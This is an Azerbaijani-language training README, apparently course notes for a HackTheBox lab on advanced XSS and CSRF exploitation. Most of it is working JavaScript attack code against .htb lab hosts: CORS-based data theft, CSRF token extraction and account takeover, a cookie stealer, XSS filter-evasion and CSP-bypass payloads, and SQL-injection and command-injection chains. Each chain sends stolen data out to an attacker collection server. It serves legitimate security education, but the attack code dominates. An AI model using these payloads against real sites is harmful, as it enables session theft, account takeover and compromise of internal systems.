# Advanced XSS və CSRF Exploitation - Tətəbbü Rehbəri

## 📋 Mündəricat

1. [Giriş](#giriş)
2. [Əsas Konseptlər](#əsas-konseptlər)
3. [CSRF Exploitasiyası](#csrf-exploitasiyası)
4. [Same-Origin Policy və CORS](#same-origin-policy-və-cors)
5. [CORS Yanlış Konfiqurasiyas](#cors-yanlış-konfiqurasiyas)
6. [XSS Exploitasiyası](#xss-exploitasiyası)
7. [Content Security Policy (CSP)](#content-security-policy-csp)
8. [XSS Filtre Keçmələri](#xss-filtre-keçmələri)
9. [Praktiki Laboratoriya Ortamı](#praktiki-laboratoriya-ortamı)

---

## Giriş

Bu modul **Çox-Sayt İstəyi Saxtalaşdırması (CSRF)** və **Çox-Sayt Skriptləşdirmə (XSS)** zəifliklərinə dərin nəzər salır. Modern veb-brauzerlərdə bu zəifliklərə qarşı qoruyan çoxsaylı mexanizmlərin (Same-Origin Policy, CORS, SameSite Cookies) keçilməsi üsullarını öyrənəcəksiniz.

### Tələblər
- JavaScript əsas bilikləri
- CSRF və XSS fundamentalları
- SQL Injection anlayışı
- Veb Brauzer Mühərriri bilgilər

### Məqsəd
Zəif veb-tətbiqatlarında CSRF və XSS zəifliklərinə qarşı fəal hücumları həyata keçirmək və kompleks olaraq bu hücumları birləşdirmə bacarığını inkişaf etdirmək.

---

## Əsas Konseptlər

### Modern CSRF və XSS Müdafiəsi

Müasır veb brauzerləri aşağıdakı məkanizmlərlə CSRF hücumlarını məhdudlaşdırır:

- **Same-Origin Policy** - Fərqli mənşəli saytlar arasında məlumat mübadiləsini qadağan edir
- **CORS** (Cross-Origin Resource Sharing) - Kontrollü şəkildə cross-origin istəklərinə icazə verir
- **SameSite Cookies** - Cookie-lərin cross-site istəklərdə göndərilməsini idarə edir

### Hücum Vektorları

CSRF hücumları düz formada nadir hala gəlsə də, **XSS ilə birləşdirildikdə** çox güclü bir vasitə yaranır:

```javascript
// XMLHttpRequest istifadə edərək HTTP istəyi göndərmə
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target.htb/', false);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('param1=value1&param2=value2');

// Modern Fetch API istifadə edərək
const response = await fetch('http://target.htb/', {
  method: "POST",
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'param1=value1&param2=value2'
});
```

---

## CSRF Exploitasiyası

### CSRF Nədir?

Çox-Sayt İstəyi Saxtalaşdırması, hücumçunun fəaliyyətə keçirdiyi yükün qurbanın brauzerini saxta istəq etməyə məcbur etməsi üsuludur.

**Tipik CSRF Ssenarii:**
1. Qurban Admin istifadəçi olaraq `vulnerablesite.htb` saytına daxil olub
2. Hücumçu `exploitserver.htb` saytında saxta yük yerləşdirir
3. Qurban hücumçunun saytını ziyarət edir
4. Qurbanın brauzer avtomatik olaraq `vulnerablesite.htb`-yə saxta istəq göndərir
5. Bu istəq qurbanın seans cookie-si ilə göndərilir və təsirli olur

### CSRF Müdafiə Mexanizmləri

#### 1. CSRF Token-ləri

Hər bir təhlükəli əməliyyat üçün unikal, təxmin edilə bilməyən token tələb olunur:

```html
<form method="POST" action="/update">
  <input type="hidden" name="csrf_token" value="uniqueTokenValue">
  <input type="text" name="data">
  <input type="submit">
</form>
```

#### 2. HTTP Header Yoxlamaları

Brauzer tərəfindən avtomatik olaraq göndərilən header-ləri yoxlamaq:

```
Origin: http://attacker.htb  (← Brauzer tərəfindən əlavə olunur)
Referer: http://attacker.htb/exploit  (← Brauzer tərəfindən əlavə olunur)
```

#### 3. SameSite Cookie Atributları

- **`SameSite=None`** - Cookie-lər bütün cross-site istəklərdə göndərilir
- **`SameSite=Lax`** - Cookie-lər yalnız təhlükəli istəklərdə (GET) göndərilir (Standard)
- **`SameSite=Strict`** - Cookie-lər heç bir cross-site istəkdə göndərilmir

### CSRF Exploitasiya Nümunəsi

```html
<html>
<body>
<form method="GET" action="http://vulnerablesite.htb/profile.php">
  <input type="hidden" name="promote" value="attacker_user" />
  <input type="submit" value="Click Me" />
</form>
<script>
  document.forms[0].submit();  // Avtomatik formunu göndər
</script>
</body>
</html>
```

---

## Same-Origin Policy və CORS

### Same-Origin Policy Nədir?

**Same-Origin Policy** brauzer tərəfindən tətbiq olunan təhlükəsizlik mexanizmidir. Bir mənşəyə aid JavaScript kodu başqa mənşəyə daxil ola bilməz.

**Mənşə (Origin) Tərifi:**
```
Mənşə = Sxem + Host + Port

Misal:
https://academy.hackthebox.com:443/course
└──────┬──────┘  └─────────┬─────────┘ └───┬───┘
      Sxem              Host             Port
```

**Same-Origin Nümunələri:**
```
✓ https://hackthebox.com  ←→  https://hackthebox.com:443  (Eyni mənşə)
✓ https://hackthebox.com  ←→  https://academy.hackthebox.com  (Eyni host)

✗ https://hackthebox.com  ↛  https://evil.com  (Fərqli host)
✗ https://hackthebox.com  ↛  http://hackthebox.com  (Fərqli sxem)
```

### Same-Origin Policy Olmasa

```javascript
// Xoşsuz ssenari - Same-Origin Policy olmasa:
fetch('https://mymails.htb/getmails', {credentials: 'include'})
  .then(r => r.text())
  .then(data => {
    // Hücumçuya məlumatı göndər
    fetch('https://exfiltrate.htb?data=' + btoa(data));
  });
```

### CORS Nədir?

**Cross-Origin Resource Sharing** (CORS) - Same-Origin Policy-yə kontrollü istisnalar əlavə etməyə imkan verən W3C standartı.

#### Sadə İstəklər (Simple Requests)

```
Tələb Şərtləri:
- GET, HEAD, ya POST metodu
- Xüsusi header-lər yoxdur
- Content-Type: application/x-www-form-urlencoded, multipart/form-data, ya text/plain
```

#### Preflight İstəkləri

```
Browser tərəfindən avtomatik olaraq OPTIONS istəyi göndərilir:

OPTIONS /api/data HTTP/1.1
Origin: http://vulnerablesite.htb
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type

Server Cavabı:
Access-Control-Allow-Origin: http://vulnerablesite.htb
Access-Control-Allow-Methods: POST, GET
Access-Control-Allow-Headers: Content-Type
```

#### Əsas CORS Header-ləri

| Header | Məna |
|--------|------|
| `Access-Control-Allow-Origin` | İcazə verilən mənşə(lər) |
| `Access-Control-Allow-Methods` | İcazə verilən HTTP metodları |
| `Access-Control-Allow-Headers` | İcazə verilən custom header-lər |
| `Access-Control-Allow-Credentials` | Cookie-lərin göndərilməsinə icazə |

---

## CORS Yanlış Konfiqurasiyas

### 1. Ixtiyari Mənşə Yansıması (Arbitrary Origin Reflection)

**Zəiflik:** Tətbiqat Origin header-ini birbaşa yansıtır

```javascript
// Hücumçu istəyi:
GET /api/data HTTP/1.1
Origin: http://attacker.htb

// Server Cavabı (YANLIŞ):
Access-Control-Allow-Origin: http://attacker.htb  ← Yanlış!
Access-Control-Allow-Credentials: true
```

**Exploitasiya:**
```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
xhr.withCredentials = true;
xhr.onload = () => {
  // Qurbanın məlumatını oğurla
  fetch('http://attacker.htb/steal?data=' + btoa(xhr.response));
};
xhr.send();
```

### 2. Uyğun Olmayan Mənşə Whitelist-i

**Zəiflik:** Whitelist-in suffix yoxlaması zəifdir

```javascript
// Tətbiqat yalnız "vulnerablesite.htb" ilə bitən mənşələri qəbul edir
if (origin.endsWith('vulnerablesite.htb')) {
  // Qəbul Et - YANLIŞ!
}

// Hücumçu: http://attacker-vulnerablesite.htb istifadə edə bilər
```

### 3. Null Mənşəsi Qəbulu

**Zəiflik:** Null mənşəsi açıq şəkildə qəbul olunur

```html
<!-- Sandboxed iframe null mənşə yaradır -->
<iframe sandbox="allow-scripts" src="data:text/html,<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
xhr.withCredentials = true;
xhr.send();
</script>"></iframe>
```

### 4. Daxili Şəbəkəni Hədəf Almaq

**Ssenari:** Firewall arxasındakı daxili API-lara hücum

```javascript
// Hücumçu saxta payload göstərir
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://172.16.0.2/internal-api', true);
xhr.send();

xhr.onload = () => {
  // Daxili API-dan məlumatı oğurla (qurban daxili şəbəkədədirsə)
  fetch('http://attacker.htb/data=' + btoa(xhr.response));
};
```

### 5. CSRF Token-lərini CORS Vasitəsilə Keçmə

**Zəiflik:** CORS misconfiguration + SameSite=None + CSRF Token

```javascript
// 1. CSRF token-ini oxu
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerablesite.htb/profile.php', false);
xhr.withCredentials = true;
xhr.send();

// 2. HTML-dən token-i çıxar
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrf_token = doc.getElementById('csrf').value;

// 3. Token ilə CSRF hücumu həyata keçir
var csrf_req = new XMLHttpRequest();
csrf_req.open('POST', 'https://vulnerablesite.htb/profile.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send('promote=attacker&csrf=' + csrf_token);
```

---

## XSS Exploitasiyası

### HTTPOnly Cookie Flag

**Qorunan Mexanizm:**
```
HttpOnly flag JavaScript tərəfindən cookie-yə daxil olmağı qadağan edir

document.cookie  ← HTTPOnly flag-ı olan cookie-lər burada görünməyəcək
```

**Amma:** XSS yenə də təhlükəli qalır, çünki hücumçu tətbiqatın fəaliyyətlərini icra edə bilər.

### Məlumatın Exfiltrasiyası

```javascript
// 1. Admin endpoints-ə daxil ol
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.withCredentials = true;
xhr.send();

// 2. Cavabı Base64-ə çevir
var encoded = btoa(xhr.responseText);

// 3. Exfiltration Server-ə göndər
var exfil = new XMLHttpRequest();
exfil.open('GET', 'http://exfiltrate.htb/log?data=' + encoded, false);
exfil.send();
```

### Hesab Ələktronu (Account Takeover)

```javascript
// 1. CSRF token-ini oxu
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();

var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrf_token = doc.getElementById('csrf_token').value;

// 2. Şifrəni dəyiş
var change_pw = new XMLHttpRequest();
change_pw.open('POST', '/home.php', false);
change_pw.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
change_pw.withCredentials = true;
change_pw.send('username=admin&email=hacker@evil.com&password=pwned&csrf_token=' + csrf_token);
```

### Zəiflikləri Birləşdirmə (Vulnerability Chaining)

```javascript
// 1. Admin panelindən LFI endpoint-ini kəşf et
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php?view=../../../../etc/passwd', false);
xhr.withCredentials = true;
xhr.send();

// 2. Faylı exfil et
var exfil = new XMLHttpRequest();
exfil.open('GET', 'http://exfiltrate.htb/files?data=' + btoa(xhr.responseText), false);
exfil.send();
```

### Daxili API-ları Enumerate Etmə

```javascript
// Daxili API endpoint-lərini test et
var endpoints = ['users', 'admin', 'config', 'sessions', 'logs'];

for (let i = 0; i < endpoints.length; i++) {
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://api.internal.htb/v1/' + endpoints[i], false);
    // withCredentials istifadə etmə - CORS xətası verə bilər
    xhr.send();
    
    if (xhr.status !== 404) {
      // Endpoint mövcuddur - məlumatı exfil et
      var exfil = new XMLHttpRequest();
      exfil.open('GET', 'http://exfiltrate.htb/api?ep=' + endpoints[i] + 
                        '&data=' + btoa(xhr.responseText), false);
      exfil.send();
    }
  } catch (error) {
    // Əsas olaraq CORS xətası
  }
}
```

### SQL Injection Zəifliyi Exploitasiyası

```javascript
// XSS vasitəsilə daxili veritabanına SQL injection hücumu

// 1. Auth bypass
var params = "uname=' OR '1'='1' -- -&pass=x";
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://internal.app/login', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

// 2. Cədvəlləri enum et
params = "uname=' UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master-- -&pass=x";
xhr.open('POST', 'http://internal.app/login', false);
xhr.send(params);

// 3. Məlumatı dump et
params = "uname=' UNION SELECT id,username,password,info FROM users-- -&pass=x";
xhr.open('POST', 'http://internal.app/login', false);
xhr.send(params);

// 4. Exfil et
var exfil = new XMLHttpRequest();
exfil.open('GET', 'http://exfiltrate.htb/db?data=' + btoa(xhr.responseText), false);
exfil.send();
```

### Command Injection Zəifliyi Exploitasiyası

```javascript
// Daxili tətbiqatda command injection

var params = "webapp=| id";  // Pipe istifadə edərək əmr inject et
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://internal.app/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

// Nəticəni exfil et
var exfil = new XMLHttpRequest();
exfil.open('GET', 'http://exfiltrate.htb/cmd?result=' + btoa(xhr.responseText), false);
exfil.send();
```

---

## Content Security Policy (CSP)

### CSP Əsasları

**Məqsəd:** XSS zəifliklərinə qarşı defense-in-depth qoruması

```
Content-Security-Policy: script-src 'self' https://trusted.com; 
                         img-src 'self'; 
                         style-src *;
```

### Əsas Direktifləri

| Direktif | Məna |
|----------|------|
| `script-src` | JavaScript yükləmə mənbələri |
| `style-src` | CSS yükləmə mənbələri |
| `img-src` | Şəkil mənbələri |
| `connect-src` | Fetch/XHR istəkləri məhdudlaşdırması |
| `frame-ancestors` | Iframe-ə icazə verilən mənbələr |
| `form-action` | Form göndərmə məhdudlaşdırması |
| `default-src` | Digər direktiflərin fallback-ı |

### Direktif Qiymətləri

| Qiymət | Məna |
|--------|------|
| `'self'` | Eyni mənşə |
| `'none'` | Heç bir istənilən mənşə |
| `*` | Bütün mənşələr |
| `*.domain.com` | Subdomenləri |
| `'unsafe-inline'` | Inline skriptlərə icazə (RISKLI) |
| `'unsafe-eval'` | eval() funksiyasına icazə (RISKLI) |
| `sha256-hash` | Hash ilə element təsdiqi |
| `nonce-value` | Nonce ilə element təsdiqi |

### Təhlükəsiz CSP Baseline

```
Content-Security-Policy: 
  default-src 'none'; 
  script-src 'self'; 
  connect-src 'self'; 
  img-src 'self'; 
  style-src 'self'; 
  frame-ancestors 'self'; 
  form-action 'self';
```

---

## XSS Filtre Keçmələri

### JavaScript İcrasının 3 Yolu

#### 1. Script Tag

```html
<script>alert(1)</script>
```

#### 2. Pseudo-Protokol

```html
<!-- javascript: protokol -->
<a href="javascript:alert(1)">Klik et</a>

<!-- data: protokol -->
<object data="javascript:alert(1)"></object>
<object data="data:text/html,<script>alert(1)</script>"></object>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

#### 3. Event Handler

```html
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<body onload="alert(1)">
```

### Basic Blacklist Keçmə

```javascript
// 1. Case Mixing (büyük-kiçik hərflər)
<ScRiPt>alert(1)</ScRiPt>
<img src=x OnErRoR=alert(1)>

// 2. Nested Tag İnjeksiyası (rekursiv olmayan filtrə qarşı)
<scr<script>ipt>alert(1);</scr<script>ipt>

// 3. Boşluq Olmadan Event Handler
<svg/onload=alert(1)>
<script/src="http://evil.htb/x.js"></script>

// 4. Pseudo-Protokol Variantları
<object data="JaVaScRiPt:alert(1)"></object>
```

### String Kodlamaları

```javascript
// Unicode Kodlama
"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"  // alert(1)

// Octal Kodlama
"\141\154\145\162\164\50\61\51"  // alert(1)

// Hex Kodlama
"\x61\x6c\x65\x72\x74\x28\x31\x29"  // alert(1)

// Base64 + atob()
atob("YWxlcnQoMSk=")  // alert(1)

// String.fromCharCode()
String.fromCharCode(97,108,101,114,116,40,49,41)  // alert(1)

// RegExp .source
/alert(1)/.source

// URL Decoding
decodeURI(/alert(%22xss%22)/.source)
```

### Execution Sink-ləri

```javascript
// eval()
eval("alert(1)")

// setTimeout()/setInterval()
setTimeout("alert(1)")
setInterval("alert(1)")

// Function()
Function("alert(1)")()

// Constructor Chain
[].constructor.constructor("alert(1)")()

// Kodlanmış String ilə birlikdə
eval("\141\154\145\162\164\50\61\51")
setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))
Function(atob("YWxlcnQoMSk="))()
```

### JSONP ilə CSP Keçmə

**Ssenari:** CSP yalnız `'self'` və `*.google.com`-dan script qəbul edir

```html
<!-- Google JSONP endpoint -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"></script>

<!-- Nəticə: CSP keçildi -->
```

### 'self' CSP Keçmə (File Upload)

```html
<!-- Əgər tətbiqat file upload-a icazə verirsə -->
<script src="/uploads/avatar.jpg.js"></script>

<!-- avatar.jpg adlı .js faylı upload edir -->
```

---

## SameSite Cookie Keçmə

### Client-Side Redirect Exploitasiyası

```html
<!-- SameSite=Strict olmasına baxmayaraq, client-side redirect keçir -->
<script>
  // Target saytın daxil olunmuş endpoint-i
  document.location = "http://vulnerable.htb/redirect?url=http://vulnerable.htb/profile.php?promote=attacker";
</script>
```

**Səbəb:** Client-side redirect hedefin saytı tərəfindən edilir, SameSite olaraq sayılır

### Subdomain XSS ilə CSRF Keçmə

```javascript
// Zəif DNS konfiguration ilə hər subdoment SameSite sayılır

// Subdomain-də XSS:
// http://guestbook.vulnerable.htb/?xss=<script>...

// Bu POST request-i göndər (SameSite=Strict olmasına baxmayaraq):
var csrf_req = new XMLHttpRequest();
var params = 'promote=attacker';
csrf_req.open('POST', 'http://vulnerable.htb/profile.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

---

## Praktiki Laboratoriya Ortamı

### Laboratoriya Komponentləri

#### 1. **Exfiltration Server** (`exfiltrate.htb`)

Məlumat oğurlanmasında istifadə olunur. Bütün parametrləri qeyd edir.

```bash
# GET parametrlər ilə məlumat göndərmə
curl -X POST --data 'param1=Hello' http://exfiltrate.htb?param2=World

# Qeydləri oxumaq
curl http://exfiltrate.htb/log

# Brauzer-də yoxlamaq
http://exfiltrate.htb/log
```

**Log Formatı:**
```
/?param2=World
Host: exfiltrate.htb
User-Agent: curl/7.88.1
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 172.17.0.1
param1=Hello
```

#### 2. **Exploit Development Server** (`exploitserver.htb`)

Exploit-lərin hazırlanması və tərəfindən məlumatın göndərilməsi

```
/exploit - Hazırlanan exploit-i göstər
/deliver - Qurbana exploit-i çatdır (hədəf sayt ziyarət edir)
```

#### 3. **Zəif Veb-Tətbiqat** (`vulnerablesite.htb`)

Test üçün zəif tətbiqat

### Laboratoriya Payı Adımları

#### XSS Warm-Up

```javascript
// 1. Zəifliyi Təsbit Et
<script>alert(1)</script>  // Guestbook-a göndər

// 2. Cookie-lərini Oğurlamaq Üçün Exploit Yazma
// exploitserver.htb/exploit-də:
window.location = "http://exfiltrate.htb/cookiestealer?c=" + document.cookie;

// 3. XSS yükünü referans ver (Guestbook-da):
<script src="http://exploitserver.htb/exploit"></script>

// 4. Admin-in cookie-lərini oxu
http://exfiltrate.htb/log
```

#### CSRF Warm-Up

```html
<!-- exploitserver.htb/exploit-də CSRF payload -->
<html>
<body>
<form method="GET" action="http://csrf.vulnerablesite.htb/profile.php">
  <input type="hidden" name="promote" value="attacker-user" />
  <input type="submit" value="Submit" />
</form>
<script>
  document.forms[0].submit();
</script>
</body>
</html>

<!-- Qurbana göndərmə -->
http://exploitserver.htb/deliver
```

---

## Praktiki Ssenariylər

### Ssenari 1: CSRF Token Zəifliyi

```javascript
// Token Unix Timestamp-ləri ilə:
// Birinci token: 1692981700
// İkinci token: 1692981702

// Zəif token brute-force
for (let i = 1692981700; i < 1692981800; i++) {
  // Hər token-i test et
}
```

### Ssenari 2: Header Validasiyası Bypass

```html
<!-- Tətbiqat Referer-i "vulnerablesite.htb" daxilində yoxlayır -->
<!-- Amma substring match-dir: -->
<script src="http://exploitserver.htb/somepath/vulnerablesite.htb"></script>
```

### Szenario 3: JSON İçində CSRF

```html
<form method="POST" enctype="text/plain" action="/api/update">
  <input type="hidden" name='{"action": "promote", "user": "attacker", "dummy' 
         value='": "x"}' />
</form>
<script>
  document.forms[0].submit();
</script>

<!-- Nəticə: Content-Type: text/plain
{"action": "promote", "user": "attacker", "dummy=": "x"}
-->
```

---

## Xülasə və Tövsiyələr

### Hücum Zənciri

```
1. XSS zəifliyi kəşf et
    ↓
2. Admin/əsas istifadəçi daxil olsun
    ↓
3. Admin kontekstinə erişim qazanma
    ↓
4. Daxili ağ məlumatlarını enumerate et
    ↓
5. Baş zəiflikləri (SQL, Command Injection) eksploit et
    ↓
6. Sistem üzərində tam kontrol
```

### Qorunan Mexanizmlərin Kəsişməsi

| Mexanizm | Keçmə Yolu |
|----------|-----------|
| SameSite=Lax | GET-based CSRF / Client-side Redirect |
| SameSite=Strict | Subdomain XSS / Client-side Redirect |
| CSRF Token | CORS Misconfiguration |
| CSP | JSONP Endpoints / File Upload |
| Same-Origin | XSS / CORS Misconfiguration |

### Debugging Səmtləri

```javascript
// Hər zaman try-catch istifadə et
try {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://internal-api.htb/data', false);
  xhr.send();
  // Məlumat işlə
} catch (error) {
  // CORS xətası, səbəb bilin
  console.log('Xəta:', error);
}

// Console-a xəta yaz
// Browser developer tools ilə debugging
```

### Laboratoriya Qaydaları

1. **Qurban istifadəçisini sabırlı olun** (bir neçə dəqiqə çəkə bilər)
2. **Her laboratoriya arasında cookie-ləri silin**
3. **Browser versiyasını yoxlayın** (Chromium 114.0.5735.90)
4. **URL-də port istifadə etməyin** (CSRF ile problem yaratır)
5. **GET parametrlərində böyük məlumatlar üçün POST istifadə et**

---

## Qaynaqlar

- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net)
- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com)
- [Content Security Policy Reference](https://content-security-policy.com)
- [JSONP Bypass Techniques](https://github.com/zigoo0/JSONBee)

---

**Sona Catdı** ✓

Bu README, Advanced XSS və CSRF Exploitation modulunun tam məzmunu ehtiva edir. Hər bir bölmə praktiki nümunələr ilə dəstəklənir və real dünya ssenariylərini əhatə edir.
